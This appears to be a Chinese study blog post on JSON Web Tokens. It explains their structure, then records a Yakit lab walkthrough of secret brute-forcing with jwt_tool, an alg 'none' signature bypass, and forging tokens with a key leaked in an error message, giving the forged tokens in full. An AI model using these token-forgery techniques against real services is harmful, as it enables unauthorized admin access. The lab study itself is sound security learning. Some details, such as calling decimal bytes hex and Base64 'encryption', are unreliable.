---
title: JWT
lang: zh
date: 2025-04-11
---
1. 身份验证：修改某个用户密码，管理员。cookie
2. 会话管理：客户端连续不断的和服务器进行请求和响应
3. 控制访问：登陆模块 登陆给定身份 身份去访问后台地址 /admin等


参考 https://forum.butian.net/share/2734

参考 https://www.cnblogs.com/xiaozi/p/12005929.html
## 组成

JWT =Json Web Token   
head payload signature

JWT = Base64(Header) + "." + Base64(Payload) + "." + Base64(Signature)

JWTString =
Base64(Header) + "." + Base64(Payload) + "." 
+Base64(HMAC_SHA256(Header + "." + Payload, Secret))

JWT本质上是一个字符串，分为三个部分:

1. **Header**: 存放Token类型和加密的方法
2. **Payload**: 包含一些用户身份信息.
3. **Signature**: 签名是将前面的Header,Payload信息以及一个密钥组合起来并使用Header中的算法进行加密


### Header

在 JWT 中 Header 部分存储的是 Token 类型和加密算法，通常使用JSON对象表示并使用Base64编码，其中包含两个字段：alg和typ

- alg(algorithm)：指定了使用的加密算法，常见的有HMAC、RSA和ECDSA等算法
- typ(type)：指定了JWT的类型，通常为JWT

下面是一个示例Header：

```json
{
  "alg": "HS256", 
  "typ": "JWT"
}
```

### Payload 部分

Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64编码，Payload中包含三个类型的字段：注册声明、公共声明和私有声明

- 公共声明：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等
- 私有声明：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等
- 注册声明：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等

下面是一个示例Payload：

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```
其中sub表示主题，name表示名称，iat表示JWT的签发时间

### Signature 部分

Signature是使用指定算法对Header和Payload进行签名生成的，用于验证JWT的完整性和真实性

- Signature的生成方式通常是将Header和Payload连接起来然后使用指定算法对其进行签名，最终将签名结果与Header和Payload一起组成JWT
- Signature的生成和验证需要使用相同的密钥

下面是一个示例Signature

```php
HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)
```

其中HMACSHA256是使用HMAC SHA256算法进行签名，header和payload是经过Base64编码的Header和Payload，secret是用于签名和验证的密钥，最终将Header、Payload和Signature连接起来用句点(.)分隔就形成了一个完整的JWT

### 完整的JWT

第一部分是Header，第二部分是Payload，第三部分是Signature，它们之间由三个 `.` 分隔，注意JWT 中的每一部分都是经过Base64编码的，但并不是加密的，因此JWT中的信息是可以被解密的

下面是一个示例JWT

```php
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

## 工作原理

JWT的工作流程如下：

- 用户在客户端登录并将登录信息发送给服务器
- 服务器使用私钥对用户信息进行加密生成JWT并将其发送给客户端
- 客户端将JWT存储在本地，每次向服务器发送请求时携带JWT进行认证
- 服务器使用公钥对JWT进行解密和验证，根据JWT中的信息进行身份验证和授权
- 服务器处理请求并返回响应，客户端根据响应进行相应的操作

验证流程：

![](https://pic.desolatehao.top/ba2a3d82b67f4900d98e959db19b86e4.png)


## 爆破密钥

JWT 字典 https://github.com/wallarm/jwt-secrets   
JWT tool https://github.com/ticarpi/jwt_tool   
使用参考 [https://www.cnblogs.com/xiaozi/p/12005929.html](https://www.cnblogs.com/xiaozi/p/12005929.html)   

```
git clone https://github.com/ticarpi/jwt_tool

python3 jwt_tool.py eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiIsImZsYWciOnRydWV9.eyJ1c2VybmFtZSI6ImFkbWluIn0.hPJrgFH1DKiTTI5Zujw2PiaaQ-7Q3LAQWKyhaYRd000 -C -d jwt.secrets.txt 

```
这里没爆破出来
![](https://pic.desolatehao.top/432cc139bf731b71625d53bdbdc5ef19.png)



## yakit靶场记录

### JWT 未验证算法漏洞

http://192.168.3.5:8787/jwt/unsafe-login1

进入之后 经典弱口令起手 admin/admin 进入后台
![](https://pic.desolatehao.top/29d834030ebb7af8af68209abc7a78cb.png)
弹出
![](https://pic.desolatehao.top/49c9fafbd70caeb9887934446599e865.png)

检查数据包
![](https://pic.desolatehao.top/347ed1b6a3044cbbe23c0dc5b1a8e311.png)
![](https://pic.desolatehao.top/d239e85732385eae1429cc7527e5178e.png)

涉及两个url
```
http://192.168.3.5:8787/jwt/unsafe-login1 
http://192.168.3.5:8787/jwt/unsafe-login1/profile
```
在unsafe-login1 的返回包中给定了JWT 
```
eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF5RXk
```

目标是在header中添加flag字段
```
eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9
解码如下
{"age":25,"alg":"HS256","kid":1,"typ":"JWT","username":"admin"}

添加flag属性，修改alg加密算法为none
{  
    "age": 24,  
    "alg": "none",  
    "kid": 1,  
    "typ": "JWT",  
    "username": "admin",  
    "flag": True  
} 加密后为
eyJhZ2UiOiAyNCwgImFsZyI6ICJub25lIiwgImtpZCI6IDEsICJ0eXAiOiAiSldUIiwgInVzZXJuYW1lIjogImFkbWluIiwgImZsYWciOiB0cnVlfQ==

现在重新登陆 拦截访问/jwt/unsafe-login1/profile的数据包并修改
将原来的JWT请求改为如下
eyJhZ2UiOiAyNCwgImFsZyI6ICJub25lIiwgImtpZCI6IDEsICJ0eXAiOiAiSldUIiwgInVzZXJuYW1lIjogImFkbWluIiwgImZsYWciOiB0cnVlfQ==.eyJ1c2VybmFtZSI6ImFkbWluIn0.
第三段留空
```
![](https://pic.desolatehao.top/fe7085135ea688a83b2fd982c62eceff.png)
![](https://pic.desolatehao.top/62ebe8c5f167c9a3b950ca99ffb9c99a.png)

这里给出官方的图
![](https://pic.desolatehao.top/ca2b09dd55251ea58d5c4fd09c8dc9a2.png)

### JWT 错误中泄露Key

依旧是登录框 admin/admin 进入
![](https://pic.desolatehao.top/6fbe62421688ef7e304bcd7b807336df.png)

测试修改部分JWT 发现报错回显 其中泄露密钥
![](https://pic.desolatehao.top/45195d9ee87e1d43fc7f53a2c6bbf5b1.png)
```
原JWT为
eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF5RXk

报错为如下
parse jwt faild, 
jwt: Bearer eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF, 
key: [84 81 90 74 68 68 97 99 74 103 76 117 121 80 112 73 65 106 111 88],
error: signature is invalid
```

其中header字段中解码为如下，加密算法为HS256，解码key
```
{"age":25,"alg":"HS256","kid":1,"typ":"JWT","username":"admin"}

暴露出的key为
[84 81 90 74 68 68 97 99 74 103 76 117 121 80 112 73 65 106 111 88]
hex格式 转码为
TQZJDDacJgLuyPpIAjoX 验证一下 正确了
```
构造JWT
![](https://pic.desolatehao.top/dc8266fcde873f85c8dc7deea4390c68.png)
```
eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiIsImZsYWciOnRydWV9.eyJ1c2VybmFtZSI6ImFkbWluIn0.hPJrgFH1DKiTTI5Zujw2PiaaQ-7Q3LAQWKyhaYRd000
```

重新登陆拦截测试
![](https://pic.desolatehao.top/c98465eaa358f0aed6c2e98a19f0a4c9.png)
![](https://pic.desolatehao.top/bdc3a6c9b50277638420f8ecbb9bd1fa.png)

